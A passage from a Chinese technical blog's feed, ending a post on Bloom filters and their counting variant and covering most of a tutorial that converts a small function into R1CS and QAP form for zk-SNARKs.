测试100万条错误数据</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1000000</span>; i &lt; <span class="number">2000000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bloomFilter.mightContain(i)) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.printf(<span class="string">&quot;总共的误判数：%.0f, 误判率：%f&quot;</span>, count, count/size);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/img/Bloom-Filter概念原理/image-20211006172258402.png" alt="image-20211006172258402"  /></p><p>可以看到Google提供的布隆过滤器的效果更好，100万条错误数据中误判率为0.01。<strong>所以对于布隆过滤器而言，好的哈希函数是核心，这一点放到哪个与哈希相关的数据结构都是一样的。</strong></p><h1 id="特性及应用">特性及应用</h1><h2 id="特性">特性</h2><ul><li>虽然布隆过滤器带来了一定的错误率，但是相较于其他数据结构(如自平衡二叉搜索树、字典树、哈希表、单链表、数组)有巨大的存储空间优势。上述的其他数据结构最少都需要将所有数据都保存到数据结构中(字符串类型中字典树除外，它可以减小将相同前缀的字符串的存储空间)。</li></ul><p>布隆过滤器不需要存储全部数据，存储数据的工作需要另外一个部件进行(如下图所示，过滤器充当一个中间件)，布隆过滤器只提供查询的功能(是不是很像Redis)，比如wiki中的示意图：</p><p><img src="/img/Bloom-Filter概念原理/image-20211005205423468.png" alt="image-20211005205423468" style="zoom:80%;" /></p><p>当然上述的架构中也有缺点：</p><ul><li>假阳性(key3的请求)</li><li>布隆过滤器带来的更多的内存占用</li></ul><p>wiki中描述布隆过滤器的该优势具体如下：</p><blockquote><p>A Bloom filter with a 1% error and an optimal value of <em>k</em>, incontrast, requires only about 9.6 bits per element, regardless of thesize of the elements. This advantage comes partly from its compactness,inherited from arrays, and partly from its probabilistic nature. The 1%false-positive rate can be reduced by a factor of ten by adding onlyabout 4.8 bits per element.</p><blockquote><p>相比之下，一个布隆过滤器在合适的k值的条件下，错误率仅为1%，且无论元素大小，每个元素只需要9.6个bit位。其优势来源于数组的紧凑性以及天然的概率特性。此外，这个1%的错误率在每个元素增加4.8个bit位的条件下，甚至还可以再减小10倍。</p></blockquote></blockquote><ul><li>布隆过滤器的<strong>增加</strong>和<strong>查询</strong>操作的复杂度都是常数级--<em>O(k)</em>，和存储的元素数量无关。这个属性是其他数据结构所不具备的，并且这k次查找是可以通过并行来减小时间的。</li></ul><h2 id="应用例子">应用例子</h2><p>以下应用例子均来自wiki，随便挑了几个。</p><ul><li>内容交付商AkamaiTechnologies在服务器上使用布隆过滤器来有效减少磁盘工作负载并提高磁盘缓存命中率。</li><li>Google Bigtable、Apache HBase、ApacheCassandra、PostgreSQL使用布隆过滤器来降低对不存在的数据的磁盘查找次数，避免了较大的磁盘开销，提高了数据库的查询效率。</li><li>GoogleChrome浏览器应用布隆过滤器来判别恶意的URL，若本地的布隆过滤器判断是阳性，则会对该完整的URL进行判断，并对用户进行警告。</li><li>比特币曾使用布隆过滤器来加速钱包的同步，后来其使用的布隆过滤器的实现发现了漏洞。</li><li>以太坊使用布隆过滤器来实现链上快速的日志查找。</li></ul><h2 id="布隆过滤器变种-counting-bloom-filters">布隆过滤器变种-CountingBloom Filters</h2><h3 id="概念及原理-1">概念及原理</h3><p>据wiki描述，大概有60种以上的布隆过滤器变种，这里由于我个人原因我只关注CountingBloomFilters，该过滤器支持了原始布隆过滤器不支持的<strong>删除</strong>操作。该过滤器在论文<code>Fan, Li; Cao, Pei; Almeida, Jussara; Broder, Andrei (2000), "Summary Cache: A Scalable Wide-Area Web Cache Sharing Protocol" , IEEE/ACM Transactions on Networking, 8 (3): 281–293, on 2017-09-22</code>中提出。</p><p>怎么理解呢？在计数布隆过滤器中，我们把每一个数组的位置叫做<em>bucket</em>，将每一个数组的每一个位置由一个单一的bit位变为了多个比特的计数器(<em>amulti-bitcounter</em>)。而普通的布隆过滤器你可以理解为一个<em>bucket</em>为1的计数布隆过滤器。</p><p>对于一个计数布隆过滤器：</p><ul><li>当你添加一个元素时，就为该数组的对应下标的<em>bucket</em>的值<strong>增加1</strong>。</li><li>当你删除这个元素的时候则为这个<em>bucket</em>的值<strong>减1</strong></li><li>当你查询一个元素的时候，若该元素对应下标的<em>bucket</em>的值均非0，则该元素存在</li></ul><h3 id="问题及替代品">问题及替代品</h3><ol type="1"><li>计数布隆过滤器为了避免溢出问题，<em>bucket</em>的上限要足够大，通常取3到4bits，所以他使用的存储空间是普通布隆过滤器的3至4倍。</li></ol><p><strong>而在论文：</strong></p><ul><li><code>Pagh Anna; Pagh Rasmus; Rao S. Srinivasa (2005), "An optimal Bloom filter replacement" Proceedings of the Sixteenth Annual ACM-SIAM Symposium on Discrete Algorithms, pp. 823–829</code></li><li><code>Fan, Bin; Andersen, Dave G.; Kaminsky, Michael; Mitzenmacher, Michael D.(2014), "Cuckoo filter: Practically better than Bloom", Proc. 10th ACM Int. Conf. Emerging Networking Experiments and Technologies (CoNEXT '14), pp. 75–88,</code></li></ul><p>中所提出的过滤器也支持删除操作，且比普通过滤器使用的存储空间要小。</p><ol start="2" type="1"><li>计数布隆过滤器的可扩展性受限，因为它的表(table)不可扩展，过滤器中存储的元素的最大数量必须提前预知，<strong>一旦前期设定好的阈值提前到达了，那么随着后续元素的不断插入，过滤器的错误率将不断提高。</strong></li></ol><p><strong>而在论文</strong>：</p><ul><li><p><code>Bonomi Flavio; Mitzenmacher Michael; Panigrahy Rina; Singh Sushil; Varghese George (2006), "An Improved Construction for Counting Bloom Filters", Algorithms – ESA 2006, 14th Annual European Symposium, 4168, pp. 684–695,</code>中提出的过滤器可以<strong>避免可扩展性受限的问题</strong>，且仅大约<strong>使用计数过滤器一半的空间</strong>就可以实现相同的功能。</p></li><li><p><code>Rottenstreich, Ori; Kanizo, Yossi; Keslassy, Isaac (2012), "The Variable-Increment Counting Bloom Filter", 31st Annual IEEE International Conference on Computer Communications, 2012, Infocom 2012, pp. 1880–1888</code>中提出的过滤器中引入了一种基于可变增量的通用方法，显著降低了计数布隆过滤器及其变体的错误率，且仍然支持删除操作。不同的是插入元素时将递增一个哈希变量增量而不是一个单位增量，在查询元素时需要考虑计数器值的正确性，而不仅仅是数值。</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Bloom
Filter（布隆过滤器）是一种空间利用很高的数据结构，使用一个数据来表示一个集合，用于判断一个元素是否存在于这个集合中。但是也有妥协：在判断一个元素是否属于该集合时有可能会误判(false
positive)，故不适合于&quot;零错误&quot;的场景，在能够容忍低错误率的场合下，可以通过极少的错误来换取较高的存储空间利用率。google的Guava中就有&lt;code&gt;BloomFilter&lt;/code&gt;这个类。&lt;/p&gt;
&lt;p&gt;一个比较常见的应用是缓解Redis等缓存中缓存击穿的问题。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="论文阅读" scheme="https://lzwgiter.github.io/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    
    
    <category term="论文阅读" scheme="https://lzwgiter.github.io/tags/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/tags/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>zk-SNARKs简洁的非交互式零知识证明学习(一)</title>
    <link href="https://lzwgiter.github.io/posts/85e98ef0.html"/>
    <id>https://lzwgiter.github.io/posts/85e98ef0.html</id>
    <published>2021-08-25T00:25:26.000Z</published>
    <updated>2023-03-29T16:05:56.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>zk-SNARKs即"<strong>zero knowledge Succinct Non-interactive Argumentof Knowledge</strong>"，第一次见到是在ZCash的介绍里<code>Zcash is the first widespread application of zk-SNARKs, a novel form of zero-knowledge cryptography. ...</code>，他给出了<strong>简洁</strong>的<strong>非交互式零知识证明</strong>的办法，属于零知识证明的一种。</p><p>zk-SNARKs的第一个应用就是Zcash，可以做到毫秒级的验证效果，但是产生这个证明的过程较为复杂。这篇开始学习一下流程。大致上流程如下：</p><p><strong>Computation计算问题 -&gt; Arithmetic Circuit代数电路 -&gt;R1CS -&gt; QAP -&gt; zk-SNARK</strong></p><p><img src="/img/zk-SNARKs-简洁的非交互式零知识证明学习(一)/zk-snarks.jpg" style="zoom: 80%;" /></p></blockquote><span id="more"></span><h1 id="基本概念">基本概念</h1><h2 id="什么是零知识证明">什么是零知识证明</h2><p>一句话就可以说明了：</p><blockquote><p>“Zero-knowledge” proofs allow one party (the prover) to prove toanother (the verifier) that a statement is true, without revealing anyinformation beyond the validity of the statement itself. For example,given the hash of a random number, the prover could convince theverifier that there indeed exists a number with this hash value, withoutrevealing what it is.</p></blockquote><p>即实现在不泄露真实信息的情况下证明这个我确实拥有这个信息，比如上面提到的，我可以提供给你哈希值供校验，而无需提供秘密信息本身。</p><h2 id="什么是zk-snarks">什么是zk-SNARKs？</h2><p>zk-SNARKs全称是<code>Zero-knowledge Succinct Non-interactive Argument of Knowledge</code>，名字挺长的，我们分开来看一下都包含了哪些主体：</p><ul><li>Zero-knowledge：即零知识证明，zk-SNARKs属于零知识证明的一种</li><li>Succinct：意为简洁的，zk-SNARKs的证明耗时为毫秒级，且证明的大小也仅为几百个字节</li><li>Non-interactive：即非交互式的，而传统的零知识证明，证明者<code>prover</code>和验证者<code>vervifier</code>需要来回的交互，效率较低。zk-SNARKs属于非交互式的零知识证明，你只需要给验证者提供证明，正确与否之后的操作验证者会自行执行，不会有交互反馈。</li><li>Argument ofKnowledge：<strong>这个很多人都没有提到，官网也说没必要深入探讨，但是这里还是说一下。</strong>零知识证明是proofof knowledge，保证了一个假的prover不能成功证明一个错的结论，而Argumentofknowledge在这个保证上加了一个条件--只针对计算有界的provers(computationallybounded provers)。</li></ul><h2id="为什么用zk-snarks以及future-application">为什么用zk-SNARKs以及FutureApplication？</h2><p>所以这个东西它<strong>用起来</strong>效率比较高，<code>不过目前来看证明的实现比较复杂，产生证明效率较低，离实际应用还有一段距离[1]</code>。因为属于计算密集型，所以对很多应用不够友好，官方也叙述了这一缺点以及表示正在改进：</p><blockquote><p>Theoretically, you can use a zk-SNARK to verify any relation withoutdisclosing inputs or leaking information.—<code>Generating proofs for complex functions is still too computationally intensive to be practical for many applications.</code>but the <a href="https://z.cash/team">Zcash team</a> is pushing theboundaries for optimizing zk-SNARKs, and is already breaking new groundwith more efficient implementations.</p></blockquote><p>官方指出zk-SNARKs可以作为一个组件添加到现存的区块链技术中，称为<ahref="https://electriccoin.co/blog/zsl/">ZSL</a>(Zero-knowledge SecurityLayer)。</p><p>此外，zk-SNARKs在整个代数电路的运算过程中都是在椭圆曲线上的，且依赖于<strong>配对密码学(pairing-basedcryptography)</strong>，关于配对密码学的概念、可使用的编程依赖库(比如jpbc)可以参考我兄弟的文章：<ahref="https://blank-vax.github.io/2021/07/05/基于配对的密码学——基础知识及JPBC库/">B1ank(blank-vax.github.io) - 基于配对的密码学-基础知识及JPBC库</a>。</p><p>[1]李佩丽, 徐海霞. 区块链用户匿名与可追踪技术[J]. 电子与信息学报,2020, 42.</p><h1 id="计算步骤概述">计算步骤概述</h1><p>这里直接用一张图来总结，这张图包含了本篇文章的全部内容，具体的计算细节你可以对照我的文章来看。图片来源:<ahref="https://blog.csdn.net/weixin_43179764/article/details/102807826?spm=1001.2014.3001.5501">zk-snark之R1CS-&gt;QAP_江小白希的博客-CSDN博客</a></p><p><img src="/img/zk-SNARKs-简洁的非交互式零知识证明学习(一)/20191029203605385.jpg" alt="20191029203605385"  /></p><p>下面具体叙述一下重要概念以及计算步骤。</p><h1 id="计算步骤">计算步骤</h1><p>这里以V神的教程为基础，更为详尽的在计算方面复现一下整体思路流程。</p><p>大体上来说我们的步骤如下：</p><p><img src="/img/zk-SNARKs-简洁的非交互式零知识证明学习(一)/image-20210827202233893.png" alt="image-20210827202233893" style="zoom:80%;" /></p><p>官方给出的例子是这样的一个函数，类似python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">qeval</span>(<span class="params">x</span>)：</span><br><span class="line">    y = x ** <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> x + y + <span class="number">5</span></span><br></pre></td></tr></table></figure><p>接下来我们像上面那个图一样，将这个函数变为zk-SNARKs。</p><h2id="计算问题转化为代数电路the-arithmetic-circuits">计算问题转化为代数电路(TheArithmetic Circuits)</h2><h3 id="代数电路简介以及重点说明">代数电路简介以及重点说明</h3><blockquote><p>电路(Circuits)可以有效的来表示计算模型。一个电路的主体是<strong>线路(wires)</strong>和<strong>门(gate)</strong>，其中线路携带值，而门则代表对这些值所进行的操作。</p></blockquote><p>最简单好理解的就是逻辑电路：</p><ul><li>值只能为0或1</li><li>门包含与(AND)、或(OR)、非(NOT)</li></ul><p><img src="/img/zk-SNARKs-简洁的非交互式零知识证明学习(一)/image-20210827213724273.png" alt="image-20210827213724273"  /></p><p>而在zk-SNARKs的计算过程中，我们使用代数电路(Arithmeticcircuits)，一个例子如上图，实际上就是一个代数电路的图，它是一种有向无环图，流动方向始终从输入到输出，<strong>其中的门实际上包括的就是模运算中的加减乘除(modularaddtion andmultiplication)。使用模运算是因为整个运算都是在椭圆曲线上完成的。</strong></p><p>对于上图中的等式：<spanclass="math inline">\(a^2+ab-b=n\)</span>，实际上，可以将这个式子化为两个门，我们用var等变量名来代替：<span class="math display">\[\begin{align}var_3 = var_1 * var_2 \tag{1}\\var_6 = var_4 + var_5 \tag{2}\end{align}\]</span></p><p>观察一下就可以发现a^2和ab实际上就是1式的类型，加减则是2式的类型，我们可以用伪代码来表示：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tmp_1 = a * a</span><br><span class="line">tmp_2 = a * b</span><br><span class="line">tmp_3 = tmp_1 + tmp_2</span><br><span class="line">tmp_4 = tmp_3 - b</span><br></pre></td></tr></table></figure><p>最后我们的n值就保存在了tmp_4中。</p><p>在零知识中，该电路实际上就相当于Verifier，对于一个正确的proof，prover输入有效的witness，电路应该返回1。</p><h3 id="计算问题展开-flatttening">计算问题展开 (Flatttening)</h3><blockquote><p>这是第一步，我们要将原始的功能代码转变为基本算术单元，就像上一节那样。</p></blockquote><p>这里再看一下源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">qeval</span>(<span class="params">x</span>)：</span><br><span class="line">    y = x ** <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> x + y + <span class="number">5</span>// 即返回c</span><br></pre></td></tr></table></figure><p>这里有两种类型：加法和乘法，或者更为抽象一点，只有两种类型，也就是<strong>两种门</strong></p><ul><li>x = y，单纯的赋值</li><li>x = y (opt) z，其中opt代表任意的一次计算，可能为加减乘除</li></ul><p>所以我们进行<strong>展开</strong>：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sym_1 = x * x</span><br><span class="line">y = sym_1 * x// y = x**3</span><br><span class="line">sym_2 = y + x   // x^3 + x</span><br><span class="line">~out = sym_2 + 5 // x^3 + x + 5，完成计算</span><br></pre></td></tr></table></figure><p>最后我们的输出就是<code>~out</code>变量了。其实思路很简单吧？到这里我们就生成了两种门。</p><p>展开后的式子其实计算结果是一样的，好比我们x取3，那么最终return就是35，对于上面的式子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = 3</span><br><span class="line">sym_1 = 9</span><br><span class="line">y = 27</span><br><span class="line">sym_2 = 30</span><br><span class="line">~out = 35 -- 最终结果=</span><br></pre></td></tr></table></figure><h2 id="r1csa-rank-1-constraint-system">R1CS(a rank-1 constraintsystem)</h2><h3 id="r1cs简介以及重点说明">R1CS简介以及重点说明</h3><p>上面也说到了，我们首先要将待计算的式子简化为一系列的基本计算，构成代数电路，其中每一条线都代表这一个数值的传递，门则代表一次基本计算。那么下一步就是生成<strong>一系列的约束(Constraints)，这些约束可以断言(assert)一个门计算已经正确执行，且内部的赋值是一致的。</strong>这样的约束保证了门计算的准确性，所以我们需要给每一个门都生成一个<code>rank-1</code>的约束，<code>rank-1</code>我也不知道怎么理解，姑且认为是一条约束吧。所有这些约束条件集合起来就是R1CS(<code>A Rank-1 Constraint System</code>)。</p><p>具体有什么作用呢？<strong>如果一个假的prover向verifier进行证明的时候，由于他不知道正确的witness，并拿了个假的输出来糊弄verifier，因为他的输入就是错的，所以在代数电路中运算的时候，某一个门的输出就会导致该门的约束无效。</strong></p><p>那么问题来了，实际中一个代数过于复杂怎么办？一个个去验证岂不是很花时间？所以<code>zk-SNARKs</code>将所有这些约束都封装到了三维向量中，以此来同时验证整个约束集。这三个多项式向量下一小节会看到，它们就是<strong>A、B、C</strong>。</p><h3 id="门运算变换为r1cs">门运算变换为R1CS</h3><p>上面说了<code>zk-SNARKs</code>将R1CS整理为了一个三维向量，其中每一个门我们也一样用一个三维向量来描述：<code>(a, b, c)</code>，最终所有门三维向量的组合我们用<code>(A, B, C)</code>表示，其中的A由所有的a组成，另外两个也类似。</p><p>那为啥要用三元组呢？<strong>因为从上面我们简化后的计算来看，我们右边都最多只有两个数，并进行赋值，所以用三元组就可以表示这个等式了</strong>。</p><p>那么这个三维向量的a、b、c有什么关系呢？我们首先定义这个R1CS的解是<code>s</code>，则有如下关系：<span class="math display">\[\begin{align}(s·a) * (s·b) - s·c = 0 \\or \\(s·a) * (s·b) = s·c\end{align}\]</span></p><p>根据我们简化后的运算，我们可以看到需要如下几个变量，其中<code>~one</code>是常量1，用来得到我们需要的常量，比如等式中的5。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[~one、x、~out、sym_1、y、sym_2] // 下标从0开始，可以看做一个数组</span><br></pre></td></tr></table></figure><p>那么对于第一个门:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sym_1 = x * x</span><br></pre></td></tr></table></figure><p>它的三元组如下</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [0, 1 ,0, 0, 0, 0] // 我们可以看到第二个元素也就是下标1的位置为1，代表输入x</span><br><span class="line">b = [0, 1, 0, 0, 0, 0] // 输入x</span><br><span class="line">c = [0, 0, 0, 1, 0, 0] // 代表得到sym_1，而sym_1的下标是3</span><br></pre></td></tr></table></figure><p>是不是发现有点像往内存单元里面填数据的感觉？<strong>对号入座</strong>，那么剩下三个门及其三元组如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// y = sym_1 * x</span><br><span class="line">a = [0, 0, 0, 1, 0, 0] // 输入sym_1</span><br><span class="line">b = [0, 1, 0, 0, 0, 0] // 输入x</span><br><span class="line">c = [0, 0, 0, 0, 1, 0] // y = sym_1 * x</span><br><span class="line"></span><br><span class="line">// sym_2 = y + x</span><br><span class="line">a = [0, 1, 0, 0, 1, 0] // 输入y + x</span><br><span class="line">b = [1, 0, 0, 0, 0, 0] // 相当于1*y + 1*x，即x + y</span><br><span class="line">c = [0, 0, 0, 0, 0, 1] // sym_2 = y + x</span><br><span class="line"></span><br><span class="line">// ~out = sym_2 + 5</span><br><span class="line">a = [5, 0, 0, 0, 0, 1] // 输入sym_2 + 5</span><br><span class="line">b = [1, 0, 0, 0, 0, 0] // 相当于1*sym_2 + 1*5，即sym_2 + 5</span><br><span class="line">c = [0, 0, 1, 0, 0, 0] // ~out = sym_2 + 5</span><br></pre></td></tr></table></figure><p><strong>然后我们把4个门的a放到一起就是A，剩下的一样</strong>。比如对于有k个门的R1CS，它的A：<span class="math display">\[A = \begin{bmatrix}    A_1[1]&amp;A_1[2]&amp;... &amp;A_1[n]\\    &amp;...\\    A_k[1]&amp;A_k[2]&amp;... &amp;A_k[n]\\    \end{bmatrix}\]</span> 所以我们就得到了最终的R1CS： <span class="math display">\[A = \begin{bmatrix}        0, &amp;1, &amp;0, &amp;0, &amp;0, &amp;0\\        0, &amp;0, &amp;0, &amp;1, &amp;0, &amp;0\\        0, &amp;1, &amp;0, &amp;0, &amp;1, &amp;0\\        5, &amp;0, &amp;0, &amp;0, &amp;0, &amp;1    \end{bmatrix}B = \begin{bmatrix}        0, &amp;1, &amp;0, &amp;0, &amp;0, &amp;0\\        0, &amp;1, &amp;0, &amp;0, &amp;0, &amp;0\\        1, &amp;0, &amp;0, &amp;0, &amp;0, &amp;0\\        1, &amp;0, &amp;0, &amp;0, &amp;0, &amp;0    \end{bmatrix}\\C = \begin{bmatrix}        0, &amp;0, &amp;0, &amp;1, &amp;0, &amp;0\\        0, &amp;0, &amp;0, &amp;0, &amp;1, &amp;0\\        0, &amp;0, &amp;0, &amp;0, &amp;0, &amp;1\\        0, &amp;0, &amp;1, &amp;0, &amp;0, &amp;0    \end{bmatrix}\]</span></p><h2 id="qapquadratic-arithmetic-program">QAP(quadratic arithmeticprogram)</h2><h3 id="概念">概念</h3><p><code>Quadratic Arithmetic Program</code>简称QAP，我也不知道叫啥，应该是二次代数规划吧emmmm。他的作用如下：</p><blockquote><p>a way of representing any computational problem with a polynomialequation that is much more amenable to various forms of mathematicaltrickery.</p></blockquote><p>即他可以用多项式等式来表示一个可计算的问题，更便于数学计算。那为啥我们要把R1CS转变为QAP呢？这俩啥区别？</p><p>实际上QAP和R1CS的逻辑是一样的，区别在于将向量的点积运算转变为了多项式。下面阐述一下过程。</p><h3 id="r1cs计算qap">R1CS计算QAP</h3><p>在上一章中我们得到了多项式<code>x^3 + x + 5</code>的R1CS，这个R1CS的内容Prover和Verifier双方都知道。接下来我们来构造QAP。</p><ul><li>我们都有什么？我们有四个门的对应的(a, b,c)三个向量，其中a，b，c长度均为6</li><li>我们要做什么？我们要把这一共四个门的、每个门三组、每组包含长度为6的三个向量的数据，依旧转变为(A，B，C)，但是区别是A，B，C每个组包含了长度为4的6个向量，即6*4，而不是R1CS那样的4x6</li></ul><p>那我们怎么转换呢？这里要用到一个定理：拉格朗日插值法，这里很快过一下：</p><blockquote><p>拉格朗日插值法(Lagrange InterpolationPolynomial)指可以找到一个多项式，该多项式恰好在各个观测的点取到观测值，说人话就是找到一条过指定的一些点的一条曲线。</p></blockquote><p>公式内容如下： <span class="math display">\[\begin{align}现有点(x_0,y_0),(x_1, y_1),...,(x_{n-1},y_{n-1}),设D_n=\{0,...,n-1\}，B_k=\{k|k \ne i,i \inD_n\}。\\对于每一个x存在一个符合观测值的多项式p_k(x)，使p_k(x) = \prod\limits_{i \inB_k}\frac{x-x_i}{x_k-x_i}。\\则满足上述所有观测点的f(x)=\sum_{j=0}^{n-1}y_ip_j(x)\\end{align}\]</span></p><p>看着比较复杂，实际上比较好记，<strong>即对于每一个点的多项式，它是这么来的：用未知数x减去其他点的x的乘积除以该点x减其他点的x的乘积，最后乘一个该点y，最后的最后把所有点多项式一加就可以了。</strong>给一个例子吧，过点(1,3)，(2, 2)，(3, 4)的函数：</p><p><span class="math display">\[f(x) = \frac{(x-2)(x-3)}{(1-2)(1-3)}\cdot3 +\frac{(x-1)(x-3)}{(2-1)(2-3)}\cdot2 +\frac{(x-1)(x-2)}{(3-1)(3-2)}\cdot4=\frac{3}{2}x^2-\frac{11}{2}x+7\]</span></p><p>该算法的时间复杂度为<code>O(n^3)</code>其中n代表点的个数，而每个点计算多项式需要<code>O(n^2)</code>的时间复杂度，我们可以利用快速傅里叶变化来降低时间复杂度，因为实际中会有成千个门。然后我们再来看怎么转换我们的R1CS，我们以A矩阵为例，B，C都要进行相同的操作。</p><p><strong>这里重点来了，很多网上的文章都没有说这一部分是怎么来的，包括最开始那张总结全部流程的图，A是啥？可以看成矩阵，那我们要使用拉格朗日插值法得有点啊，纳闷了点哪来的啊？官网描述的我反正来来回回看了三四遍没看懂啥意思：</strong></p><blockquote><p>What we are going to do is take the first value out of every avector, use Lagrange interpolation to make a polynomial out ofthat(where evaluating the polynomial at <code>i</code> gets you thefirst value of the ith <code>a</code> vector)</p></blockquote><p>然后<strong>从最后这句话</strong>自己试出来结论了，首先我们取A矩阵的第一列作为纵坐标，而横坐标则是行数，上面我们得到的A：<span class="math display">\[A = \begin{bmatrix}        0, &amp;1, &amp;0, &amp;0, &amp;0, &amp;0\\        0, &amp;0, &amp;0, &amp;1, &amp;0, &amp;0\\        0, &amp;1, &amp;0, &amp;0, &amp;1, &amp;0\\        5, &amp;0, &amp;0, &amp;0, &amp;0, &amp;1    \end{bmatrix}\]</span></p><p>则四个点分别为：(1, 0)，(2, 0)，(3, 0)，(4,5)，然后对这四个点进行拉格朗日插值法得到多项式：</p><p><span class="math display">\[f(x)=\frac{(x-1)(x-2)(x-3)}{(4-1)(4-2)(4-3)}\cdot5=\frac{5}{6}x^3-5x^2+\frac{55}{6}x-5\]</span>然后我们把这个多项式转成行向量，即从左到右依次是低次项到高次项的系数，实际上就是多项式的矩阵化。</p><p>得(也就是V神的结果)，B，C同理：</p><p><img src="/img/zk-SNARKs-简洁的非交互式零知识证明学习(一)/image-20210827194403264.png" alt="image-20210827194403264" style="zoom:80%;" /></p><p>上述的数据就是QAP了，当然上述的过程只需要执行一次，一旦QAP参数生成后，就可以复用了。</p><p>假如x取1，那么就可以得到如下结果(就是多项式赋值):</p><p><img src="/img/zk-SNARKs-简洁的非交互式零知识证明学习(一)/image-20210827194711274.png" alt="image-20210827194711274" style="zoom:80%;" /></p><p>这恰好和我们R1CS的A、B、C的第一行行向量对应，这也就是作者说的那句：&gt; where evaluating the polynomial at <code>i</code> gets you thefirst value of the ith <code>a</code> vector)</p><p>你x取多少，A算出来的就是R1CS中第x个a，你比如x取<strong>1</strong>上面算出来是[0,1, 0, 0, 0,0]，这不就是我们R1CS的第1行吗？不就是<strong>第一个门的a</strong>吗？</p><h3 id="qap正确性检查">QAP正确性检查</h3><p>好了到这里其实本文主体就结束了，下来我们验证一下QAP，这样我们就不需要去验证我们的R1CS了。在验证过程中，如果每一个门(x=1,2,3,4)他的多项式计算出来是0，那就对了，否则就不对，比如<code>y = x * sym_1</code>结果<code>x=2和sym_1=2，y=5</code>，那显然输入输出是不匹配的。</p><p>具体计算方法呢？</p><p><span class="math display">\[h=\frac{(A \cdot s)*(B \cdot s) - C \cdot s}{Z}, Z=(x - 1)*(x - 2)*(x -3)..., t=(A \cdot s)*(B \cdot s) - C \cdot s\]</span></p><p>其中Z是一个在任意门x都为零的多项式，即有k个门，则Z就乘到(x-k)。</p><p>所以有：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A . s = [43.0, -73.333, 38.5, -5.166]</span><br><span class="line">B . s = [-3.0, 10.333, -5.0, 0.666]</span><br><span class="line">C . s = [-41.0, 71.666, -24.5, 2.833]</span><br></pre></td></tr></table></figure><p>这里我们就需要多项式矩阵化的乘法规则了，这个属于单另的知识，包括怎么矩阵化后进行多项式的乘法和除法，这部分请参考学习：<ahref="https://zhuanlan.zhihu.com/p/58665745?utm_source=qq&amp;utm_medium=social&amp;utm_oi=894491492633182208">多项式的矩阵表示及乘法运算- 知乎 (zhihu.com)</a>。</p><p>所以<code>(A·s)*(B·s)-C·s</code>：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t=[-88.0, 592.666, -1063.777, 805.833, -294.777, 51.5, -3.444]</span><br></pre></td></tr></table></figure><p>又因为<code>Z=(x - 1)*(x - 2)*(x - 3)(x - 4)</code>，所以</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Z = [24, -50, 35, -10, 1]</span><br></pre></td></tr></table></figure><p>我们得到最终的h，且该结果无余数</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h = t / Z = [-3.666, 17.055, -3.444]</span><br></pre></td></tr></table></figure><p>还记得前面说过R1CS的解(solution)是<code>s</code>吗，对于x取3，记不记得我们的s是[1,3, 35, 9, 27,30]？如果说我们的solution是假的，比如把最后的30换成31，这就会导致当x=3的时候t算出来不是0(是-1)，且t/Z的结果也会有余数(结果是<code>[-5.0, 8.833, -4.5, 0.666]</code>)</p><h1 id="后续内容安排">后续内容安排</h1><p>这篇主要介绍了zk-SNARKs的基础概念，以及是怎么把计算问题转换为R1CS和QAP的、如何验证QAP，但是没有涉及协议本身的验证过程、目前可使用的库等，下一篇将详细讨论这些内容。</p><h1 id="参考学习">参考学习</h1><p>官方zcash中zk-SNARKs介绍：<ahref="https://z.cash/technology/zksnarks/">What are 